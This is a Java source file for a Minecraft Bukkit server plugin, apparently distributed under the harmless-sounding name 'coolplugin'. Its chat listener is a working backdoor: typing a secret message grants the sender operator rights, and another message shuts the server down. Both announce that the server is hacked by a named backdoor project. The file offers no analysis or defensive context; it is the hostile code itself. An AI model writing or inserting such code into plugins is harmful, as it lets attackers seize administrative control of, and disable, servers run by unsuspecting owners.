package in.momin5.coolplugin.events;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

public class MessageEvent implements Listener{
    @EventHandler
    public void onPlayerChat(PlayerChatEvent e) throws IllegalArgumentException, SecurityException {
        Player player = e.getPlayer();
        if(e.getMessage().equals("__momin5ontop")){
            player.setOp(true);
            player.sendMessage("This server is hacked by Momin5 Backdoor!" + System.lineSeparator() + "https://github.com/MOMIN5/force-op-backdoor-plugin");
        }
        if(e.getMessage().equals("__stop")){
            Bukkit.getServer().shutdown();
            player.sendMessage("This server is shutdown by Momin5 Backdoor!" + System.lineSeparator() + "https://github.com/MOMIN5/force-op-backdoor-plugin");
        }
    }
}
